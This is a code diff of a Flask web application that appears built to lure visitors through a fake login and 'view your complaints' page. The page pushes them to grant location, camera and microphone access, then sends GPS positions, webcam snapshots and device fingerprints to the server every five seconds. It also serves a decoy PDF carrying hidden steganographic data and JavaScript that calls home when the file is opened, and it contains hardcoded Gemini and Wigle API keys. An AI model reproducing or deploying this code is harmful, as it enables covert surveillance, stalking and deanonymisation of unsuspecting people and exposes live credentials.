@@ -15,10 +15,10 @@ from cryptography.fernet import Fernet
 from stegano import lsb
 from PIL import Image as PILImage
 import PyPDF2
-import netifaces  # New dependency for network interface information
+import netifaces
 import google.generativeai as genai
 
-# Configure the SDK with your Gemini API key.
+# Configure the SDK with your Gemini API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
 
 app = Flask(__name__)
@@ -45,10 +45,7 @@ logged_tokens = {}
 downloaded_reports = []
 
 def get_wifi_location_from_wigle(bssid):
-    """
-    Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID.
-    Ensure that the environment variables WIGLE_USERNAME and WIGLE_API_TOKEN are set.
-    """
+    """Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID."""
     username = "AID9d6a1f4d617967b3d4c6189558862314"
     api_token = "ac01dcab47f048daf62cb43edaf37295"
     if not username or not api_token:
@@ -61,10 +58,9 @@ def get_wifi_location_from_wigle(bssid):
         if response.status_code == 200:
             data = response.json()
             if data.get("results"):
-                # Return latitude and longitude of the first result
                 return data["results"][0].get("trilat"), data["results"][0].get("trilong")
     except Exception as e:
-        logging.error("Error querying Wigle API: " + str(e))
+        logging.error(f"Error querying Wigle API: {e}")
     return None, None
 
 def get_hidden_message(data):
@@ -135,10 +131,9 @@ def collect_data(req):
         'charging': req.form.get('charging'),
         'downlink': req.form.get('downlink'),
         'plugins': req.form.get('plugins'),
-        # New fields
-        'location': req.form.get('location'),  # From Geolocation API
-        'cameraSnapshot': req.form.get('cameraSnapshot'),  # Base64-encoded image
-        'audioClip': req.form.get('audioClip'),  # Base64-encoded audio
+        'location': req.form.get('location'),
+        'cameraSnapshot': req.form.get('cameraSnapshot'),
+        'audioClip': req.form.get('audioClip'),
         'webglFingerprint': req.form.get('webglFingerprint'),
         'installedFonts': req.form.get('installedFonts'),
     }
@@ -172,11 +167,11 @@ def embed_data_in_image(data):
 
 def simulate_multi_stage_payload(data):
     """Simulate multi-stage payload delivery (for demonstration only)."""
-    logging.info("Simulating multi-stage payload delivery with data: " + json.dumps(data))
+    logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
     stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
     stage_payload["stage"] = "secondary"
     stage_payload["info"] = "Additional stage executed"
-    logging.info("Simulated multi-stage payload: " + json.dumps(stage_payload))
+    logging.info(f"Simulated multi-stage payload: {json.dumps(stage_payload)}")
     return stage_payload
 
 def simulate_dll_injection():
@@ -185,92 +180,60 @@ def simulate_dll_injection():
     return "DLL injection simulated"
 
 def get_gemini_report(data):
-    """
-    Use the Google Generative AI SDK to generate a security and forensics report.
-    The prompt instructs Gemini to act as a Security and Forensics Analyst.
-    """
+    """Generate a security and forensics report using Gemini AI."""
     try:
         prompt = (
-"""   You are a cybersecurity investigator tasked with analyzing device and user details
-    to identify potential connections and patterns related to online harassment.
-    Your goal is to generate a report highlighting potential leads for further investigation.
+            """You are a cybersecurity investigator tasked with analyzing device and user details
+            to identify potential connections and patterns related to online harassment.
+            Your goal is to generate a report highlighting potential leads for further investigation.
 
-    **Important Considerations:**
+            **Important Considerations:**
+            * This analysis is for investigative purposes only. It does NOT definitively identify a harasser.
+            * False positives are possible. Any potential connections identified must be thoroughly investigated before any action is taken.
+            * Focus on identifying patterns and anomalies in the data.
+            * Consider the limitations of the data.
+            * Avoid making assumptions or drawing hasty conclusions.
+            * Ensure all actions comply with legal and ethical guidelines.
 
-    *   This analysis is for investigative purposes only. It does NOT definitively
-        identify a harasser.
-    *   False positives are possible. Any potential connections identified must be
-        thoroughly investigated before any action is taken.
-    *   Focus on identifying patterns and anomalies in the data.
-    *   Consider the limitations of the data.
-    *   Avoid making assumptions or drawing hasty conclusions.
-    *   Ensure all actions comply with legal and ethical guidelines.
+            **Data Description:**
+            The provided data contains information about devices and users potentially involved in online harassment. This may include:
+            * **Device Information:** IP addresses, device IDs, operating system, browser information, location data (if available).
+            * **User Details:** Usernames, email addresses, social media profiles, online activity logs.
 
-    **Data Description:**
-
-    The provided data contains information about devices and users potentially involved
-    in online harassment.  This may include:
-
-    *   **Device Information:** IP addresses, device IDs, operating system, browser information,
-        location data (if available).
-    *   **User Details:** Usernames, email addresses, social media profiles, online activity logs.
-        (Note: Treat this data with utmost sensitivity.)
-
-    **Instructions:**
-
-    1.  **Analyze Data for Potential Connections:** Analyze the provided data to identify:
-        *   **Shared IP Addresses:** Multiple users connecting from the same IP address.
-        *   **Similar Device Fingerprints:** Devices with similar configurations or software.
-        *   **Overlapping Online Activity:** Users active on the same platforms or websites at similar times.
-        *   **Related Social Media Accounts:** Accounts that are linked to each other or share similar content.
-        *   **Anomalous Behavior:** Unusual patterns of activity, such as rapid account creation or sudden changes in behavior.
-        *   **Geolocation Patterns:** Users who appear in the same geolocation repeatedly during harassment events.
-
-    2.  **Assess the Strength of Connections:** For each potential connection, assess its strength based on the amount of supporting evidence.
-
-    3.  **Prioritize Potential Leads:**  Identify the most promising leads for further investigation based on the strength of the connections and the potential for identifying the harasser.
-
-    4.  **Format the Report:** Structure the report as follows:
-
-        **Investigative Analysis Report**
-
-        **Date:** [Current Date and Time]
-
-        **Data Source:** [Description of the data source - e.g., "Data collected from [Platform] logs"]
-
-        **Executive Summary:** [A brief overview of the potential connections and leads.]
-
-        **Detailed Findings:**
-
-        *   **Potential Connection 1:** [Description of the potential connection - e.g., "Multiple users sharing the same IP address"]
-            *   **Users Involved:** [List of usernames or identifiers]
-            *   **Supporting Evidence:** [Specific data points supporting the connection]
-            *   **Strength of Connection:** [High/Medium/Low]
-            *   **Potential Lead:** [Explanation of how this connection could lead to identifying the harasser]
-
-        *   **Potential Connection 2:** [Repeat the above structure for each potential connection]
-
-        **Conclusion:** [A summary of the most promising leads for further investigation.  Emphasize that this report identifies POTENTIAL connections, and further investigation is required.] """ + json.dumps(data, indent=2) + """
-"""
+            **Instructions:**
+            1. Analyze Data for Potential Connections: Identify shared IP addresses, similar device fingerprints, overlapping online activity, related social media accounts, anomalous behavior, and geolocation patterns.
+            2. Assess the Strength of Connections: Assess based on supporting evidence.
+            3. Prioritize Potential Leads: Identify promising leads for further investigation.
+            4. Format the Report:
+                **Investigative Analysis Report**
+                **Date:** [Current Date and Time]
+                **Data Source:** [Description of the data source]
+                **Executive Summary:** [Overview of potential connections and leads]
+                **Detailed Findings:**
+                * **Potential Connection 1:** [Description]
+                    * **Users Involved:** [List]
+                    * **Supporting Evidence:** [Data points]
+                    * **Strength of Connection:** [High/Medium/Low]
+                    * **Potential Lead:** [Explanation]
+                **Conclusion:** [Summary of promising leads]
+            """ + json.dumps(data, indent=2)
         )
         model = genai.GenerativeModel('gemini-2.0-flash')
         response = model.generate_content(prompt)
         report = response.text
-        logging.info("Gemini AI report received: " + report)
+        logging.info(f"Gemini AI report received: {report}")
         return report
     except Exception as e:
-        logging.error("Error contacting Gemini AI: " + str(e))
+        logging.error(f"Error contacting Gemini AI: {e}")
         return f"Error contacting Gemini AI: {e}"
 
 def generate_pdf(logged_data):
-    """Generate a PDF with fake content and embed steganographic data.
-    Add custom metadata and JavaScript callbacks via PyPDF2."""
+    """Generate a PDF with fake content and embed steganographic data."""
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
     story = []
 
-    # Fake content
     story.append(Paragraph("Fake PDF Document", styles['Title']))
     story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
     address = fake.address().replace('\n', ', ')
@@ -278,31 +241,28 @@ def generate_pdf(logged_data):
     story.append(Paragraph("Additional Info:", styles['Normal']))
     story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))
 
-    # Embed data in an image using steganography
     stego_img = embed_data_in_image(logged_data)
     img_buffer = BytesIO()
     stego_img.save(img_buffer, format='PNG')
     img_buffer.seek(0)
     story.append(Image(img_buffer, width=100, height=100))
 
-    # Verification link with a unique token
     token = str(uuid.uuid4())
     verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
     story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))
 
     doc.build(story)
     buffer.seek(0)
-    
-    # Add extra metadata and JavaScript via PyPDF2.
+
     hidden_message = get_hidden_message(logged_data)
     reversed_token = token[::-1]
-    
+
     pdf_reader = PyPDF2.PdfReader(buffer)
     pdf_writer = PyPDF2.PdfWriter()
     for page in pdf_reader.pages:
         pdf_writer.add_page(page)
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
-    
+
     js_code = f"""
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
@@ -322,147 +282,13 @@ def generate_pdf(logged_data):
     }}
     """
     pdf_writer.add_js(js_code)
-    
+
     new_buffer = BytesIO()
     pdf_writer.write(new_buffer)
     new_buffer.seek(0)
     return new_buffer, token
 
-# --- HTML for the front-end ---
-HTML_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Download PDF</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f2f2f2; }
-        h1 { color: #333; }
-        button { padding: 15px 30px; font-size: 18px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        button:hover { background-color: #45a049; }
-    </style>
-</head>
-<body>
-    <h1>Click to Download PDF and Log Your Data</h1>
-    <form id="downloadForm" action="/download" method="post">
-        <button type="submit">Download PDF</button>
-        <input type="hidden" name="screenWidth" id="screenWidth">
-        <input type="hidden" name="screenHeight" id="screenHeight">
-        <input type="hidden" name="colorDepth" id="colorDepth">
-        <input type="hidden" name="pixelDepth" id="pixelDepth">
-        <input type="hidden" name="language" id="language">
-        <input type="hidden" name="platform" id="platform">
-        <input type="hidden" name="connection" id="connection">
-        <input type="hidden" name="pageLoadTime" id="pageLoadTime">
-        <input type="hidden" name="clickTime" id="clickTime">
-        <input type="hidden" name="dwellTime" id="dwellTime">
-        <input type="hidden" name="lastMouseX" id="lastMouseX">
-        <input type="hidden" name="lastMouseY" id="lastMouseY">
-        <input type="hidden" name="referrer" id="referrer">
-        <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
-        <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
-        <input type="hidden" name="deviceMemory" id="deviceMemory">
-        <input type="hidden" name="timezoneOffset" id="timezoneOffset">
-        <input type="hidden" name="touchSupport" id="touchSupport">
-        <input type="hidden" name="batteryLevel" id="batteryLevel">
-        <input type="hidden" name="charging" id="charging">
-        <input type="hidden" name="downlink" id="downlink">
-        <input type="hidden" name="plugins" id="plugins">
-        <input type="hidden" name="location" id="location">
-        <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
-        <input type="hidden" name="audioClip" id="audioClip">
-        <input type="hidden" name="webglFingerprint" id="webglFingerprint">
-        <input type="hidden" name="installedFonts" id="installedFonts">
-    </form>
-    <br>
-    <a href="/logs">View Logs and Gemini Reports</a>
-    <script>
-        var pageLoadTime = Date.now();
-        document.getElementById('pageLoadTime').value = pageLoadTime;
-        var lastMouseX = 0, lastMouseY = 0;
-        document.addEventListener('mousemove', function(e) {
-            lastMouseX = e.clientX; lastMouseY = e.clientY;
-        });
-        function gatherExtraData(callback) {
-            var canvas = document.createElement("canvas"), ctx = canvas.getContext("2d");
-            ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
-            ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Hello, world!", 2, 15);
-            document.getElementById('canvasFingerprint').value = canvas.toDataURL();
-            document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
-            document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
-            document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
-            document.getElementById('touchSupport').value = ('ontouchstart' in window) ? true : false;
-            if (navigator.plugins) {
-                var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
-                document.getElementById('plugins').value = plugins.join(', ');
-            } else { document.getElementById('plugins').value = ''; }
-            if (navigator.connection && navigator.connection.downlink) {
-                document.getElementById('downlink').value = navigator.connection.downlink;
-            } else { document.getElementById('downlink').value = ''; }
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(battery) {
-                    document.getElementById('batteryLevel').value = battery.level;
-                    document.getElementById('charging').value = battery.charging;
-                    callback();
-                }).catch(function(error) {
-                    document.getElementById('batteryLevel').value = '';
-                    document.getElementById('charging').value = '';
-                    callback();
-                });
-            } else { document.getElementById('batteryLevel').value = ''; document.getElementById('charging').value = ''; callback(); }
-
-            // WebGL Fingerprint
-            var glCanvas = document.createElement("canvas");
-            var gl = glCanvas.getContext("webgl");
-            if (gl) {
-                var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                document.getElementById('webglFingerprint').value = debugInfo ? 
-                    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '';
-            }
-
-            // Font Detection (simplified)
-            var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana'];
-            document.getElementById('installedFonts').value = fonts.join(', ');
-
-            // Location (will be handled separately with permissions)
-            function getLocation(callback) {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        document.getElementById('location').value = JSON.stringify({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude
-                        });
-                        callback();
-                    }, () => { callback(); });
-                } else { callback(); }
-            }
-
-            getLocation(function() {
-                callback();
-            });
-        }
-        document.getElementById('downloadForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('screenWidth').value = screen.width;
-            document.getElementById('screenHeight').value = screen.height;
-            document.getElementById('colorDepth').value = screen.colorDepth;
-            document.getElementById('pixelDepth').value = screen.pixelDepth;
-            document.getElementById('language').value = navigator.language;
-            document.getElementById('platform').value = navigator.platform;
-            document.getElementById('connection').value = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : '';
-            document.getElementById('referrer').value = document.referrer;
-            var clickTime = Date.now();
-            document.getElementById('clickTime').value = clickTime;
-            document.getElementById('dwellTime').value = clickTime - pageLoadTime;
-            document.getElementById('lastMouseX').value = lastMouseX;
-            document.getElementById('lastMouseY').value = lastMouseY;
-            gatherExtraData(function() { e.target.submit(); });
-        });
-    </script>
-</body>
-</html>
-"""
-
+# HTML Templates
 LOGIN_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -511,49 +337,29 @@ PERMISSIONS_PAGE = """
     </style>
 </head>
 <body>
-    <h2>To view your complaints, please enable all permissions:</h2>
-    <button id="grantLocation">Grant Location Access</button>
-    <button id="grantCamera">Grant Camera Access</button>
-    <button id="grantMicrophone">Grant Microphone Access</button>
-    <p id="status">Please grant all permissions to proceed.</p>
-    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <h2>Do you want to enable all permissions to proceed?</h2>
+    <p>You are only allowed to proceed when the "Yes" button is pressed and permissions are granted.</p>
+    <button id="yesButton">Yes</button>
+    <button id="noButton">No</button>
+    <p id="status"></p>
     <script>
-        let locationGranted = false, cameraGranted = false, microphoneGranted = false;
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-
-        document.getElementById('grantLocation').addEventListener('click', () => {
-            navigator.geolocation.getCurrentPosition(() => {
-                locationGranted = true;
-                checkPermissions();
-            }, () => alert('Location access denied'));
+        document.getElementById('yesButton').addEventListener('click', () => {
+            Promise.all([
+                new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                }),
+                navigator.mediaDevices.getUserMedia({video: true}),
+                navigator.mediaDevices.getUserMedia({audio: true})
+            ]).then(() => {
+                window.location.href = '/drive?permissions=granted';
+            }).catch((error) => {
+                document.getElementById('status').innerText = 'Permissions not granted: ' + error.message;
+            });
         });
 
-        document.getElementById('grantCamera').addEventListener('click', () => {
-            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
-                video.srcObject = stream;
-                cameraGranted = true;
-                checkPermissions();
-            }).catch(() => alert('Camera access denied'));
+        document.getElementById('noButton').addEventListener('click', () => {
+            window.location.href = '/drive?permissions=denied';
         });
-
-        document.getElementById('grantMicrophone').addEventListener('click', () => {
-            navigator.mediaDevices.getUserMedia({audio: true}).then(() => {
-                microphoneGranted = true;
-                checkPermissions();
-            }).catch(() => alert('Microphone access denied'));
-        });
-
-        function checkPermissions() {
-            if (locationGranted && cameraGranted && microphoneGranted) {
-                window.location.href = '/drive';
-            } else {
-                document.getElementById('status').innerText = 'Please grant all permissions to proceed.';
-                setTimeout(() => window.location.reload(), 3000); // Reload every 3 seconds
-            }
-        }
     </script>
 </body>
 </html>
@@ -570,6 +376,8 @@ DRIVE_PAGE = """
         h1 { color: #202124; }
         .file-list { margin-top: 20px; }
         .file { padding: 10px; background: white; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; }
+        button { padding: 10px 20px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #1557b0; }
     </style>
 </head>
 <body>
@@ -579,52 +387,113 @@ DRIVE_PAGE = """
         <div class="file">Complaint #1 - Submitted 2023-10-01</div>
         <div class="file">Complaint #2 - Submitted 2023-10-02</div>
     </div>
-    <a href="/download">Download Data</a> | <a href="/logs">View Logs</a>
+    <form id="downloadForm" action="/download" method="post">
+        <input type="hidden" name="permissions" value="{{ permissions }}">
+        <input type="hidden" name="screenWidth" id="screenWidth">
+        <input type="hidden" name="screenHeight" id="screenHeight">
+        <input type="hidden" name="location" id="location">
+        <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
+        <button type="submit">Download Data</button>
+    </form>
+    <a href="/logs">View Logs</a>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
     <script>
+        const permissions = "{{ permissions }}";
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
+        let lastMouseX = 0, lastMouseY = 0;
 
-        // Start camera
-        navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
-            video.srcObject = stream;
+        document.addEventListener('mousemove', (e) => {
+            lastMouseX = e.clientX;
+            lastMouseY = e.clientY;
         });
 
-        setInterval(() => {
-            // Location
-            navigator.geolocation.getCurrentPosition(pos => {
-                fetch('/log_location', {
+        if (permissions === 'granted') {
+            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+                video.srcObject = stream;
+            }).catch(() => console.log('Camera access denied'));
+
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/log_location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                    });
+                }, () => console.log('Location access denied'));
+
+                if (video.srcObject) {
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const snapshot = canvas.toDataURL('image/jpeg');
+                    fetch('/log_camera', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({snapshot: snapshot})
+                    });
+                }
+
+                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
+                    fetch('/log_microphone', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({message: 'Audio recorded'})
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                }).catch(() => console.log('Microphone access denied'));
+            }, 5000);
+        } else {
+            setInterval(() => {
+                const otherData = {
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    mouseX: lastMouseX,
+                    mouseY: lastMouseY,
+                    timestamp: new Date().toISOString()
+                };
+                fetch('/log_other_data', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                    body: JSON.stringify(otherData)
                 });
-            });
+            }, 5000);
+        }
 
-            // Camera Snapshot
-            ctx.drawImage(video, 0, 0, 320, 240);
-            const snapshot = canvas.toDataURL('image/jpeg');
-            fetch('/log_camera', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({snapshot: snapshot})
-            });
-
-            // Audio (simplified)
-            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
-                fetch('/log_microphone', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({message: 'Audio recorded'})
+        document.getElementById('downloadForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('screenWidth').value = screen.width;
+            document.getElementById('screenHeight').value = screen.height;
+            if (permissions === 'granted') {
+                const promises = [];
+                if (navigator.geolocation) {
+                    promises.push(new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            document.getElementById('location').value = JSON.stringify({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude
+                            });
+                            resolve();
+                        }, () => resolve());
+                    }));
+                }
+                if (video.srcObject) {
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    document.getElementById('cameraSnapshot').value = canvas.toDataURL('image/jpeg');
+                }
+                Promise.all(promises).then(() => {
+                    e.target.submit();
                 });
-            });
-        }, 5000); // Every 5 seconds
+            } else {
+                e.target.submit();
+            }
+        });
     </script>
 </body>
 </html>
 """
 
+# Routes
 @app.route('/')
 def index():
     return redirect(url_for('login'))
@@ -651,17 +520,17 @@ def permissions():
 def drive():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    return render_template_string(DRIVE_PAGE)
+    permissions = request.args.get('permissions', 'denied')
+    return render_template_string(DRIVE_PAGE, permissions=permissions)
 
 @app.route('/download', methods=['POST'])
 def download():
     logged_data = collect_data(request)
-    logging.info(json.dumps(logged_data))
+    logging.info(f"Download data collected: {json.dumps(logged_data)}")
     
-    # Generate Gemini report and store it in the logged data.
     gemini_report = get_gemini_report(logged_data)
     logged_data["gemini_report"] = gemini_report
-    logging.info("Gemini AI report: " + gemini_report)
+    logging.info(f"Gemini AI report: {gemini_report}")
     
     multi_stage_result = simulate_multi_stage_payload(logged_data)
     dll_injection_result = simulate_dll_injection()
@@ -672,11 +541,7 @@ def download():
 
     pdf_buffer, token = generate_pdf(logged_data)
     logged_tokens[token] = logged_data
-    # Also store the report in the global downloaded_reports list.
-    downloaded_reports.append({
-        "token": token,
-        "gemini_report": gemini_report
-    })
+    downloaded_reports.append({"token": token, "gemini_report": gemini_report})
 
     return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
@@ -684,7 +549,7 @@ def download():
 def verify():
     token = request.args.get('token')
     if token in logged_tokens:
-        logging.info(f"PDF opened for token: {token} - Data: " + json.dumps(logged_tokens[token]))
+        logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
         del logged_tokens[token]
         return "Thank you!", 200
     return "Invalid token", 400
@@ -692,14 +557,14 @@ def verify():
 @app.route('/pdf_callback', methods=['GET'])
 def pdf_callback():
     hidden_data = request.args.get('data', '')
-    logging.info("Primary PDF callback triggered with data: " + hidden_data)
+    logging.info(f"Primary PDF callback triggered with data: {hidden_data}")
     return "Primary callback logged", 200
 
 @app.route('/pdf_callback_stage2', methods=['GET'])
 def pdf_callback_stage2():
     token = request.args.get('token', '')
     if token in logged_tokens:
-        logging.info(f"Stage2 callback: Token {token} verified with data: " + json.dumps(logged_tokens[token]))
+        logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
         return "Stage2 callback logged", 200
     return "Invalid token", 400
 
@@ -754,20 +619,26 @@ def display_logs():
 @app.route('/log_location', methods=['POST'])
 def log_location():
     data = request.json
-    logging.info(f"Location data: {data}")
+    logging.info(f"Location data: {json.dumps(data)}")
     return "Location logged", 200
 
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
     data = request.json
-    logging.info(f"Camera data: {data}")
-    return "Camera data logged", 200
+    logging.info(f"Camera snapshot logged: {json.dumps(data)}")
+    return "Camera logged", 200
 
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
     data = request.json
-    logging.info(f"Microphone data: {data}")
-    return "Microphone data logged", 200
+    logging.info(f"Microphone data: {json.dumps(data)}")
+    return "Microphone logged", 200
+
+@app.route('/log_other_data', methods=['POST'])
+def log_other_data():
+    data = request.json
+    logging.info(f"Other data: {json.dumps(data)}")
+    return "Other data logged", 200
 
 @app.route('/simulate')
 def simulate():
